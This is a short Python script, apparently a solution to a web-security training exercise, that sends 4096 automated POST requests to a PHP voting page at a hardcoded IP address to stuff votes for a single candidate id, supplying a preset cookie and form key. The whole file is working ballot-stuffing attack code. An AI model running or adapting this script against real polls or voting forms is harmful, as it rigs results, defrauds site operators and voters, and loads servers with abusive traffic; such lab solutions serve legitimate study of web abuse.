#!/usr/bin/python3
import requests

def vote_4_pedro():
    payload = {
        'id': 332,
        'holdthedoor':'Submit',
        'key':'0'
    }
    cookie = {
        'Max-Age':'0',
        'Max-Age':'0', 
        'HoldTheDoor':'0'
    }
    URL = 'http://158.69.76.135/level1.php'
    votes = 0
    while votes < 4096:
        r = requests.post(URL, data=payload, cookies=cookie)
        votes += 1
        print("Votes: {}".format(votes))
vote_4_pedro()
